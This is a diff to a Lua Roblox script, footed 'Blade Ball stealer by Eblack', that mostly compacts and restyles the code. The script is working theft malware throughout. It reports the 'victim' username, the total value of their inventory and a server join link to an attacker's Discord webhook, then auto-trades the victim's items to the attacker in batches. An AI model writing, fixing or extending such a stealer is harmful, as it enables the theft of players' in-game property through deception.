@@ -24,8 +24,8 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 
--- Récupération de l'avatar de la victime
-local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+-- URL de la photo de profil (PDP)
+local headshot = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. plr.UserId .. "&size=420x420&format=Png&isCircular=false"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -159,25 +159,10 @@ local function SendJoinMessage(list, prefix)
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
     
     local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link 🔗:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list 📝:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: **%s**", formatNumber(totalRAP)),
-            inline = false
-        }
+        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
+        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
+        {name = "Item list 📝:", value = "", inline = false},
+        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
     }
 
     local grouped = {}
@@ -186,61 +171,42 @@ local function SendJoinMessage(list, prefix)
             grouped[item.Name].Count = grouped[item.Name].Count + 1
             grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
         else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
+            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
         end
     end
 
     local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
     for _, group in ipairs(groupedList) do
         local itemLine = string.format("%s (x%s) - **%s RAP**", group.Name, group.Count, formatNumber(group.TotalRAP))
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
-    -- Gestion de la limite de caractères Discord
     if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+        fields[3].value = string.sub(fields[3].value, 1, 1000) .. "..."
     end
 
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
+        ["avatar_url"] = headshot, -- CHANGE LA PDP DU BOT
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = botUsername,
             ["color"] = embedColor,
             ["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot},
-            ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
-            }
+            ["thumbnail"] = {["url"] = headshot}, -- PHOTO DANS L'EMBED
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
     
-    local body = HttpService:JSONEncode(data)
     request({
         Url = webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = body
+        Body = HttpService:JSONEncode(data)
     })
 end
 
@@ -249,21 +215,9 @@ local function SendMessage(list)
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
     
     local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Items sent 📝:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: **%s**", formatNumber(totalRAP)),
-            inline = false
-        }
+        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
+        {name = "Items sent 📝:", value = "", inline = false},
+        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
     }
 
     local grouped = {}
@@ -272,22 +226,13 @@ local function SendMessage(list)
             grouped[item.Name].Count = grouped[item.Name].Count + 1
             grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
         else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
+            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
         end
     end
 
     local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
     for _, group in ipairs(groupedList) do
         local itemLine = string.format("%s (x%s) - **%s RAP**", group.Name, group.Count, formatNumber(group.TotalRAP))
@@ -297,23 +242,21 @@ local function SendMessage(list)
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
+        ["avatar_url"] = headshot, -- CHANGE LA PDP DU BOT
         ["embeds"] = {{
             ["title"] = "⚪ The hit on server 🎉" ,
             ["color"] = embedColor,
             ["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot},
-            ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
-            }
+            ["thumbnail"] = {["url"] = headshot}, -- PHOTO DANS L'EMBED
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
 
-    local body = HttpService:JSONEncode(data)
     request({
         Url = webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = body
+        Body = HttpService:JSONEncode(data)
     })
 end
 
@@ -328,10 +271,7 @@ local function buildNameToRAPMap(category)
         local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
         if success and type(decodedKey) == "table" then
             for _, pair in ipairs(decodedKey) do
-                if pair[1] == "Name" then
-                    nameToRAP[pair[2]] = rap
-                    break
-                end
+                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
             end
         end
     end
@@ -345,11 +285,7 @@ end
 
 local function getRAP(category, itemName)
     local rapMap = rapMappings[category]
-    if rapMap then
-        local rap = rapMap[itemName]
-        return rap or 0
-    end
-    return 0
+    return (rapMap and rapMap[itemName]) or 0
 end
 
 for _, category in ipairs(categories) do
@@ -374,9 +310,7 @@ if #itemsToSend > 0 then
 
     local function getNextBatch(items, batchSize)
         local batch = {}
-        for i = 1, math.min(batchSize, #items) do
-            table.insert(batch, table.remove(items, 1))
-        end
+        for i = 1, math.min(batchSize, #items) do table.insert(batch, table.remove(items, 1)) end
         return batch
     end
 
@@ -385,9 +319,7 @@ if #itemsToSend > 0 then
             sendTradeRequest(joinedUser)
             repeat wait(0.5) until inTrade
             local currentBatch = getNextBatch(itemsToSend, 100)
-            for _, item in ipairs(currentBatch) do
-                addItemToTrade(item.itemType, item.ItemID)
-            end
+            for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
 
             local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
             local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
